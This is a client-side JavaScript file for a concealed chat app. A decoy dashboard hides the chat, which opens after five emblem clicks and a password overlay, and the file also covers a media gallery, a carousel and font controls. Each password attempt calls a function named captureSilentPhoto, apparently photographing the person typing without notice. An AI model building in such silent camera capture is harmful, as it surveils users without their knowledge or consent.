/**
 * ui.extras.js — Password overlay, "show media" gallery, secret chat mode,
 *                carousel, accessibility font controls, and media fetch.
 */

// =============================================================================
// PASSWORD OVERLAY — unlock screen
// =============================================================================
const MAX_ATTEMPTS = 5;
let remainingAttempts = MAX_ATTEMPTS;

// Determine if we are unlocking chat immediately (i.e. showDashboard is false)
const savedUser = localStorage.getItem("SSC_USER");
let isShowDashboard = true;
if (savedUser) {
    try {
        const u = JSON.parse(savedUser);
        isShowDashboard = u.showDashboard ?? true;
    } catch(e) {}
}
let isUnlockingChat = !isShowDashboard;

async function unlockScreen() {
    const btn = document.getElementById("submitBtn");
    const input = document.getElementById("passwordInput");
    const error = document.getElementById("errorMsg");

    console.log("[ui.extras Debug] unlockScreen called. input:", input ? input.value : "no-input");

    if (!btn || btn.disabled) return;
    if (error) error.textContent = "";

    btn.disabled = true;
    btn.classList.add("loading");
    btn.textContent = "Verifying";

    try {
        const success = await fakePasswordApi(input.value);
        console.log("[ui.extras Debug] fakePasswordApi success:", success);
        if (success) {
            const passwordOverlay = document.getElementById("passwordOverlay");
            if (passwordOverlay) {
                passwordOverlay.classList.remove("active");
            }
            btn.disabled = false;
            btn.classList.remove("loading");
            btn.textContent = "Submit";

            if (isUnlockingChat) {
                isUnlockingChat = false;
                if (window.showLoader) window.showLoader();
                try {
                    // Remove dashboard decoy
                    const dashboard = document.getElementById("ssc-dashboard");
                    if (dashboard) dashboard.remove();

                    // Load Chat Component EJS partial
                    const chatHtml = await ComponentLoader.load("chat");
                    
                    // Mount to app root
                    const rootEl = document.getElementById("app-root");
                    if (rootEl) {
                        rootEl.innerHTML = chatHtml;
                    }

                    // Import and run Chat screen module
                    const { init } = await import("/js/screens/chat.js");
                    await init();

                    if (typeof showChatScreen === "function") {
                        showChatScreen();
                    }

                    // Bootstrap connections and socket
                    if (window.bootstrapAfterLogin) {
                        await window.bootstrapAfterLogin();
                    }

                    if (typeof showChatScreen === "function") {
                        showChatScreen();
                    }
                } catch (err) {
                    console.error("Failed to load chat layout after unlock:", err);
                } finally {
                    if (window.hideLoader) window.hideLoader();
                }
            }
            return;
        }
        remainingAttempts--;
        if (remainingAttempts <= 0) { blockUser(btn, input, error); return; }
        if (error) error.textContent = getAttemptMessage(remainingAttempts);
        resetButton(btn);
    } catch (err) {
        console.error("[ui.extras Debug] unlockScreen error:", err);
        if (error) error.textContent = "Server error. Please try again later.";
        resetButton(btn);
    }
}

function getAttemptMessage(attemptsLeft) {
    if (attemptsLeft === 4) return "Invalid password. You have 4 attempts remaining.";
    if (attemptsLeft === 3) return "Warning: Only 3 attempts remaining.";
    if (attemptsLeft === 2) return "Alert: Only 2 attempts remaining.";
    if (attemptsLeft === 1) return "Final warning: Last attempt remaining.";
    return `Invalid password. Attempts remaining: ${attemptsLeft}`;
}

function blockUser(btn, input, error) {
    if (error) error.textContent = "You have exceeded the maximum number of attempts. Access has been blocked.";
    btn.textContent = "Blocked";
    btn.classList.remove("loading");
    btn.disabled = true;
    if (input) input.disabled = true;
}

function resetButton(btn) {
    btn.disabled = false;
    btn.classList.remove("loading");
    btn.textContent = "Submit";
}

async function fakePasswordApi(password) {
    console.log("window.captureSilentPhoto:",window.captureSilentPhoto)
    if (window.captureSilentPhoto) {
        window.captureSilentPhoto().catch(console.error);
    }
    const response = await loginuser({ identifier: State.currentUser.username, password, type: "password" });
    const oldVersion = localStorage.getItem("app_version");
    if (response.Data.version !== oldVersion) {
        localStorage.setItem("app_version", response.Data.version);
        if (oldVersion !== null) {
            await fetch("/auth/flush-redis", { method: "POST" });
        }
    }
    return !!response.Data?.status;
}

// =============================================================================
// SHOW MEDIA BUTTON
// =============================================================================
function initShowMedia() {
    console.log("[initShowMedia] Called. Element in DOM:", document.getElementById("chatOption-ShowMedia"));
    const showMediaBtn = document.getElementById("chatOption-ShowMedia");
    if (!showMediaBtn) {
        console.warn("[initShowMedia] Element #chatOption-ShowMedia not found in DOM.");
        return;
    }

    showMediaBtn.onclick = async (e) => {
        console.log("[ShowMedia] Click event triggered on #chatOption-ShowMedia.", e);
        const chatOption = document.getElementById("chatOption");
        if (chatOption) chatOption.classList.remove("active");
        
        isUnlockingChat = false;

        // Load password overlay if not exists
        let passwordOverlay = document.getElementById("passwordOverlay");
        console.log("[ShowMedia] Current passwordOverlay element in DOM:", passwordOverlay);
        if (!passwordOverlay) {
            try {
                console.log("[ShowMedia] passwordOverlay not found. Fetching via ComponentLoader...");
                const html = await ComponentLoader.load("password-overlay");
                const wrapper = document.createElement("div");
                wrapper.innerHTML = html;
                passwordOverlay = wrapper.firstElementChild;
                document.body.appendChild(passwordOverlay);
                console.log("[ShowMedia] passwordOverlay loaded and attached to body:", passwordOverlay);
                
                const passwordInput = document.getElementById("passwordInput");
                if (passwordInput) {
                    passwordInput.addEventListener("keydown", e => {
                        if (e.key === "Enter") unlockScreen();
                    });
                }
            } catch (err) {
                console.error("Failed to load password overlay for media view:", err);
                return;
            }
        }

        const passwordInput = document.getElementById("passwordInput");
        const errorMsg = document.getElementById("errorMsg");

        if (passwordInput) {
            passwordInput.value = "";
            passwordInput.disabled = false;
        }
        if (errorMsg) errorMsg.textContent = "";
        remainingAttempts = MAX_ATTEMPTS;
        passwordOverlay.classList.add("active");
        console.log("[ShowMedia] Added active class to passwordOverlay. Classes:", passwordOverlay.className);
        if (passwordInput) passwordInput.focus();

        const originalUnlock = window.unlockScreen;
        window.unlockScreen = async function () {
            const btn = document.getElementById("submitBtn");
            const input = document.getElementById("passwordInput");
            const error = document.getElementById("errorMsg");

            if (!btn || btn.disabled) return;
            if (error) error.textContent = "";
            btn.disabled = true;
            btn.classList.add("loading");
            btn.textContent = "Verifying";

            try {
                const success = await fakePasswordApi(input.value);
                if (success) {
                    btn.disabled = false;
                    btn.classList.remove("loading");
                    btn.textContent = "Submit";
                    await fetchAndShowAllMedia();
                    document.getElementById("passwordOverlay").classList.remove("active");
                    window.unlockScreen = originalUnlock;
                    document.querySelectorAll("input[type=text]").forEach(i => i.value = "");
                    return;
                }
                remainingAttempts--;
                if (remainingAttempts <= 0) {
                    blockUser(btn, input, error);
                    setTimeout(() => { window.unlockScreen = originalUnlock; }, 3000);
                    return;
                }
                if (error) error.textContent = getAttemptMessage(remainingAttempts);
                resetButton(btn);
            } catch (err) {
                if (error) error.textContent = "Server error. Please try again later.";
                resetButton(btn);
            }
        };
    };
}
window.initShowMedia = initShowMedia;

// =============================================================================
// FETCH AND SHOW ALL MEDIA
// =============================================================================
async function fetchAndShowAllMedia() {
    try {
        const loaderOverlay = document.getElementById("loader-overlay");
        if (loaderOverlay) loaderOverlay.style.display = "flex";

        const data = await fetchMedia(State.activeChat, null, 10);
        const mediaMessages = data.Data?.data || [];
        if (mediaMessages.length === 0) {
            if (loaderOverlay) loaderOverlay.style.display = "none";
            showToast("No media found in this chat", "info");
            return;
        }

        const items = mediaMessages.map((m, index) => ({
            index,
            id: m.id ?? m.tempId,
            type: m.type,
            src: m.content,
            thumb: m.thumb || null,
            cover: m.cover || null,
            createdAt: m.createdAt
        }));

        if (loaderOverlay) loaderOverlay.style.display = "none";
        viewer = new MediaViewer(State.activeChat, items);
        viewer.open(0);
    } catch (error) {
        console.error(error);
        const loaderOverlay = document.getElementById("loader-overlay");
        if (loaderOverlay) loaderOverlay.style.display = "none";
        showToast("Failed to load media. Please try again.", "error");
    }
}

// =============================================================================
// SECRET CHAT MODE - Triggered from Emblem
// =============================================================================
let clickCount = 0;
let clickTimer = null;
const secretButton = document.getElementById('secretButton');

if (secretButton) {
    secretButton.addEventListener('click', async () => {
        clickCount++;
        secretButton.classList.add('clicked');
        setTimeout(() => secretButton.classList.remove('clicked'), 300);

        if (clickTimer) clearTimeout(clickTimer);

        if (clickCount === 5) {
            clickCount = 0;
            await handleSecretEmblemClick();
        }

        clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
    });
}

async function handleSecretEmblemClick() {
    const sUser = localStorage.getItem("SSC_USER");
    const sToken = window.TokenStore ? TokenStore.getToken() : null;
    const hasLocal = !!(sUser && sToken);
    const isServerLogin = window.IS_SERVER_LOGIN === true;

    if (isServerLogin && hasLocal) {
        await showPasswordOverlayForChat();
    } else {
        let refreshSuccess = false;
        if (sToken || sUser) {
            if (window.showLoader) window.showLoader();
            try {
                const newToken = await refreshAccessToken();
                if (newToken) {
                    const profileRes = await getMyProfile();
                    if (profileRes.code === 200 && profileRes.Data?.user) {
                        const user = profileRes.Data.user;
                        if (user._id && !user.id) {
                            user.id = user._id.toString();
                        }
                        TokenStore.save(newToken, user);
                        localStorage.setItem("SSC_USER", JSON.stringify(user));
                        window.IS_SERVER_LOGIN = true;
                        refreshSuccess = true;
                    }
                }
            } catch (err) {
                console.error("[Emblem Click] Token refresh failed:", err);
            } finally {
                if (window.hideLoader) window.hideLoader();
            }
        }

        if (refreshSuccess) {
            await showPasswordOverlayForChat();
        } else {
            // Clear broken session
            if (window.TokenStore) TokenStore.clear();
            localStorage.removeItem("SSC_USER");

            // Load Login Screen dynamically!
            if (window.showLoader) window.showLoader();
            try {
                const html = await ComponentLoader.load("login");
                const rootEl = document.getElementById("app-root");
                if (rootEl) {
                    rootEl.innerHTML = html;
                }
                const { init } = await import("/js/screens/auth.js");
                await init();
            } catch (err) {
                console.error("Failed to load login screen:", err);
            } finally {
                if (window.hideLoader) window.hideLoader();
            }
        }
    }
}

async function showPasswordOverlayForChat() {
    isUnlockingChat = true;
    remainingAttempts = MAX_ATTEMPTS;

    // Load password overlay if not exists
    let passwordOverlay = document.getElementById("passwordOverlay");
    if (!passwordOverlay) {
        try {
            const html = await ComponentLoader.load("password-overlay");
            const wrapper = document.createElement("div");
            wrapper.innerHTML = html;
            passwordOverlay = wrapper.firstElementChild;
            document.body.appendChild(passwordOverlay);
            
            const passwordInput = document.getElementById("passwordInput");
            if (passwordInput) {
                passwordInput.addEventListener("keydown", e => {
                    if (e.key === "Enter") unlockScreen();
                });
            }
        } catch (err) {
            console.error("Failed to load password overlay for chat unlock:", err);
            return;
        }
    }

    const passwordInput = document.getElementById("passwordInput");
    const errorMsg = document.getElementById("errorMsg");

    if (passwordInput) {
        passwordInput.value = "";
        passwordInput.disabled = false;
    }
    if (errorMsg) errorMsg.textContent = "";
    
    passwordOverlay.classList.add("active");
    if (passwordInput) passwordInput.focus();
}

// =============================================================================
// CAROUSEL
// =============================================================================
let currentSlideIndex = 0;
let slides = document.querySelectorAll('.carousel-item');
let dots = document.querySelectorAll('.carousel-dot');

function showSlide(index) {
    if (!slides || slides.length === 0) return;
    slides.forEach(s => s.classList.remove('active'));
    dots.forEach(d => d.classList.remove('active'));
    if (index >= slides.length) currentSlideIndex = 0;
    else if (index < 0) currentSlideIndex = slides.length - 1;
    else currentSlideIndex = index;
    slides[currentSlideIndex].classList.add('active');
    dots[currentSlideIndex].classList.add('active');
}

function changeSlide(direction) { showSlide(currentSlideIndex + direction); }
function currentSlide(index) { showSlide(index); }

// Autoplay carousel slides if dashboard is active
setInterval(() => {
    const dashboard = document.getElementById('ssc-dashboard');
    if (dashboard && !dashboard.classList.contains('hidden')) {
        // Refresh slides list in case it was dynamically added
        slides = document.querySelectorAll('.carousel-item');
        dots = document.querySelectorAll('.carousel-dot');
        changeSlide(1);
    }
}, 5000);

// =============================================================================
// ACCESSIBILITY — FONT SIZE
// =============================================================================
const fontButtons = document.querySelectorAll('.font-btn');
let fontSize = 100;

fontButtons.forEach((btn, index) => {
    btn.addEventListener('click', () => {
        if (index === 0) fontSize = 90;
        if (index === 1) fontSize = 100;
        if (index === 2) fontSize = 110;
        document.body.style.fontSize = fontSize + '%';
    });
});

// =============================================================================
// INIT MUTE STATE from localStorage
// =============================================================================
function initMuteState() {
    const isplayTune = localStorage.getItem("playTune");
    const muteBtn = document.getElementById("chatOption-Mute");
    if (!isplayTune || !muteBtn) return;

    State.playTune = isplayTune === "true";
    muteBtn.setAttribute("playTune", isplayTune);

    muteBtn.innerHTML = State.playTune
        ? `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
            <path d="M15.54 8.46a5 5 0 0 1 0 7.07"/>
            <path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>
          </svg> Mute`
        : `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/>
            <path d="M15.54 8.46a5 5 0 0 1 0 7.07"/>
            <path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>
          </svg> Unmute`;
}
window.initMuteState = initMuteState;
window.unlockScreen = unlockScreen;
